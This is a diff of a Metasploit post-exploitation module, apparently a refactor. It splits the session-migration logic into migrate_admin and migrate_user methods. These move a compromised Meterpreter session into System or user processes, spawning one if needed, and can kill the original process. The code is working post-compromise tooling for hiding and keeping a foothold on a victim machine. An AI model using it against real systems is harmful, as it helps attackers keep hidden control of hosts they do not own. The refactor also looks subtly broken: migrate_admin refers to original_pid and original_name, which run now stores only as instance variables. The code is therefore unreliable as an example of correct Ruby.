@@ -39,54 +39,12 @@ class Metasploit3 < Msf::Post
   end
 
   def run
-    # Populate target arrays
-    admin_targets = DEFAULT_ADMIN_TARGETS.dup
-    admin_targets.unshift(datastore['ANAME']) if datastore['ANAME']
-
-    user_targets = DEFAULT_USER_TARGETS.dup
-    user_targets.unshift(datastore['NAME']) if datastore['NAME']
-
     # Get current process information
-    original_pid = client.sys.process.open.pid
-    original_name = client.sys.process.open.name
-    print_status("Current session process is #{original_name} (#{original_pid}) as: #{client.sys.config.getuid}")
-
-    # Admin level migration starts here
-    if is_admin?
-      if !is_system?
-        print_status("Session is Admin but not System.")
-        print_status("Will attempt to migrate to a System level process.")
-      else
-        print_status("Session is already Admin and System.")
-        print_status("Will attempt to migrate to specified System level process.")
-      end
-
-      # Try to migrate to each of the System level processes in the list.  Stop when one works.  Go to User level migration if none work.
-      admin_targets.each do |target_name|
-        if migrate(get_pid(target_name), target_name, original_pid)
-          kill(original_pid, original_name) if datastore['KILL']
-          return
-        end
-      end
-      print_error("Unable to migrate to any of the System level processes.")
-    else
-      print_status("Session has User level rights.")
-    end
-
-    # User level migration starts here
-    print_status("Will attempt to migrate to a User level process.")
-
-    # Try to migrate to user level processes in the list.  If it does not exist or cannot migrate, try spawning it then migrating.
-    user_targets.each do |target_name|
-      if migrate(get_pid(target_name), target_name, original_pid)
-        kill(original_pid, original_name) if datastore['KILL']
-        return
-      end
-
-      if migrate(spawn(target_name), target_name, original_pid)
-        kill(original_pid, original_name) if datastore['KILL']
-        return
-      end
+    @original_pid  = client.sys.process.open.pid
+    @original_name = client.sys.process.open.name
+    print_status("Current session process is #{@original_name} (#{@original_pid}) as: #{client.sys.config.getuid}")
+    unless migrate_admin
+      migrate_user
     end
   end
 
@@ -123,6 +81,62 @@ class Metasploit3 < Msf::Post
       print_error(error.to_s)
       return false
     end
+  end
+
+  # Attempts to migrate into one of the Target Admin Processes.
+  #
+  # @return [TrueClass] if it successfully migrated
+  # @return [FalseClass] if it failed to migrate
+  def migrate_admin
+    if is_admin?
+      # Populate target array
+      admin_targets = DEFAULT_ADMIN_TARGETS.dup
+      admin_targets.unshift(datastore['ANAME']) if datastore['ANAME']
+
+      if is_system?
+        print_status("Session is already Admin and System.")
+      else
+        print_status("Session is Admin but not System.")
+      end
+      print_status("Will attempt to migrate to specified System level process.")
+
+      # Try to migrate to each of the System level processes in the list.  Stop when one works.  Go to User level migration if none work.
+      admin_targets.each do |target_name|
+        if migrate(get_pid(target_name), target_name, original_pid)
+          kill(original_pid, original_name) if datastore['KILL']
+          return true
+        end
+      end
+      print_error("Unable to migrate to any of the System level processes.")
+    else
+      print_status("Session has User level rights.")
+    end
+    false
+  end
+
+  # Attempts to migrate to one of the Target User Processes
+  #
+  # @return [TrueClass] if it successfully migrated
+  # @return [FalseClass] if it failed to migrate
+  def migrate_user
+    # Populate Target Array
+    user_targets = DEFAULT_USER_TARGETS.dup
+    user_targets.unshift(datastore['NAME']) if datastore['NAME']
+    print_status("Will attempt to migrate to a User level process.")
+
+    # Try to migrate to user level processes in the list.  If it does not exist or cannot migrate, try spawning it then migrating.
+    user_targets.each do |target_name|
+      if migrate(get_pid(target_name), target_name, @original_pid)
+        kill(@original_pid, @original_name) if datastore['KILL']
+        return true
+      end
+
+      if migrate(spawn(target_name), target_name, @original_pid)
+        kill(@original_pid, @original_name) if datastore['KILL']
+        return true
+      end
+    end
+    false
   end
 
   # This function will attempt to spawn a new process of the type provided by the name.
